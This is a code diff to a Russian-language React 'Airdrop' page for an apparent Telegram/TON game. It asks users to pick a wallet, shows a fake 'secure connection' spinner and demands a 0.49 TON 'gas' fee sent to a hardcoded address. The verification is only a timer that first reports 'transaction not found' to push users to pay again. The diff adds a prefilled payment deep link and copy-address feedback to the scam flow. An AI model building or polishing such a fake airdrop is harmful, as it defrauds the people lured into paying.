@@ -1,18 +1,21 @@
 import React, { useState } from 'react';
+import { useGame } from '../contexts/GameContext';
 import { WALLET_ADDRESS } from '../constants';
-import { Wallet, Loader2, CheckCircle2, AlertCircle, Copy, ExternalLink } from 'lucide-react';
+import { Wallet, Loader2, CheckCircle2, AlertCircle, Copy, ExternalLink, Check } from 'lucide-react';
 
 type Step = 'SELECT' | 'CONNECTING' | 'PAY' | 'VERIFYING' | 'ERROR' | 'SUCCESS';
 
 const Airdrop: React.FC = () => {
-  const [step, setStep] = useState<Step>('SELECT');
+  const { state, connectWallet } = useGame();
+  const [step, setStep] = useState<Step>(state.walletConnected ? 'SUCCESS' : 'SELECT');
   const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
   const [verifyCount, setVerifyCount] = useState(0);
+  const [copied, setCopied] = useState(false);
 
   const wallets = [
     { id: 'tonkeeper', name: 'Tonkeeper', icon: 'https://tonkeeper.com/assets/tonkeeper_256.png' },
     { id: 'wallet', name: 'Telegram Wallet', icon: 'https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/2048px-Telegram_logo.svg.png' },
-    { id: 'okx', name: 'OKX Wallet', icon: 'https://play-lh.googleusercontent.com/9n94N5l001D4H6zRj50_X4VnKqzK-R8mPz9O8-v8Q-rR-v_v-v_v-v_v-v_v' }, // Generic placeholder URLs if needed, using text for now or simple divs
+    { id: 'okx', name: 'OKX Wallet', icon: 'https://play-lh.googleusercontent.com/9n94N5l001D4H6zRj50_X4VnKqzK-R8mPz9O8-v8Q-rR-v_v-v_v-v_v-v_v' },
   ];
 
   const handleConnect = (walletId: string) => {
@@ -35,18 +38,26 @@ const Airdrop: React.FC = () => {
         setVerifyCount(1);
       } else {
         setStep('SUCCESS');
+        connectWallet(); // Save global state
       }
     }, waitTime);
   };
 
   const copyAddress = () => {
     navigator.clipboard.writeText(WALLET_ADDRESS);
-    // Could add toast here
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
   };
 
   return (
-    <div className="flex flex-col h-full p-6 pt-10 pb-24 overflow-y-auto">
+    <div className="flex flex-col h-full p-6 pt-10 pb-24 overflow-y-auto relative">
       
+      {/* Toast Notification */}
+      <div className={`fixed top-4 left-1/2 transform -translate-x-1/2 bg-white text-black px-4 py-2 rounded-full text-sm font-bold shadow-xl z-50 transition-all duration-300 flex items-center space-x-2 ${copied ? 'translate-y-0 opacity-100' : '-translate-y-20 opacity-0'}`}>
+        <Check size={16} />
+        <span>Адрес скопирован</span>
+      </div>
+
       {/* Title */}
       <div className="text-center mb-10">
         <h1 className="text-3xl font-bold text-white mb-2">Задания Airdrop</h1>
@@ -54,7 +65,7 @@ const Airdrop: React.FC = () => {
       </div>
 
       {step === 'SELECT' && (
-        <div className="space-y-3 animate-in fade-in slide-in-from-bottom-4 duration-500">
+        <div className="space-y-3 animate-slide-in-bottom">
             {wallets.map(w => (
                 <button
                     key={w.id}
@@ -63,7 +74,6 @@ const Airdrop: React.FC = () => {
                 >
                     <div className="flex items-center space-x-4">
                         <div className="w-10 h-10 rounded-full bg-gray-700 flex items-center justify-center text-xs overflow-hidden">
-                           {/* Fallback icon */}
                            <Wallet size={20} />
                         </div>
                         <span className="font-bold text-white">{w.name}</span>
@@ -75,14 +85,14 @@ const Airdrop: React.FC = () => {
       )}
 
       {step === 'CONNECTING' && (
-        <div className="flex flex-col items-center justify-center flex-1 animate-in fade-in zoom-in duration-300">
+        <div className="flex flex-col items-center justify-center flex-1 animate-zoom-in">
             <Loader2 size={48} className="text-blue-500 animate-spin mb-4" />
             <p className="text-white font-bold">Безопасное подключение...</p>
         </div>
       )}
 
       {(step === 'PAY' || step === 'VERIFYING' || step === 'ERROR') && (
-        <div className="bg-[#1c1c1e] rounded-2xl p-6 border border-white/10 animate-in fade-in slide-in-from-bottom-8">
+        <div className="bg-[#1c1c1e] rounded-2xl p-6 border border-white/10 animate-slide-in-bottom">
             <div className="flex justify-between items-start mb-6">
                 <div>
                     <h3 className="text-xl font-bold text-white">Требуется оплата Gas</h3>
@@ -105,15 +115,22 @@ const Airdrop: React.FC = () => {
                     <code className="text-[10px] text-gray-300 break-all flex-1 font-mono">
                         {WALLET_ADDRESS}
                     </code>
-                    <button onClick={copyAddress} className="p-2 hover:text-white text-gray-500">
-                        <Copy size={14} />
+                    <button onClick={copyAddress} className="p-2 hover:text-white text-gray-500 transition-colors">
+                        {copied ? <Check size={14} className="text-green-500" /> : <Copy size={14} />}
                     </button>
                 </div>
             </div>
 
             <div className="space-y-3">
+                {/* 
+                    DEEP LINK FORMAT:
+                    ton://transfer/<ADDRESS>?amount=<NANOTONS>&text=<COMMENT>
+                    0.49 TON = 490,000,000 nanotons
+                */}
                 <a 
-                    href={`ton://transfer/${WALLET_ADDRESS}?amount=490000000`}
+                    href={`ton://transfer/${WALLET_ADDRESS}?amount=490000000&text=FurryCombatDrop`}
+                    target="_blank"
+                    rel="noopener noreferrer"
                     className="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-xl flex items-center justify-center space-x-2 transition-colors"
                 >
                     <span>Оплатить 0.49 TON</span>
@@ -136,7 +153,7 @@ const Airdrop: React.FC = () => {
             </div>
             
             {step === 'ERROR' && (
-                <div className="mt-4 flex items-start space-x-2 text-red-400 text-xs">
+                <div className="mt-4 flex items-start space-x-2 text-red-400 text-xs animate-bounce-subtle">
                     <AlertCircle size={14} className="mt-0.5 shrink-0" />
                     <p>Мы не нашли транзакцию в последнем блоке. Пожалуйста, убедитесь, что отправили точную сумму, и попробуйте снова через 10 секунд.</p>
                 </div>
@@ -145,7 +162,7 @@ const Airdrop: React.FC = () => {
       )}
 
       {step === 'SUCCESS' && (
-        <div className="flex flex-col items-center justify-center flex-1 animate-in zoom-in duration-500">
+        <div className="flex flex-col items-center justify-center flex-1 animate-zoom-in">
             <div className="w-24 h-24 bg-green-500/20 rounded-full flex items-center justify-center mb-6 relative">
                 <div className="absolute inset-0 bg-green-500/20 rounded-full animate-ping"></div>
                 <CheckCircle2 size={48} className="text-green-500" />
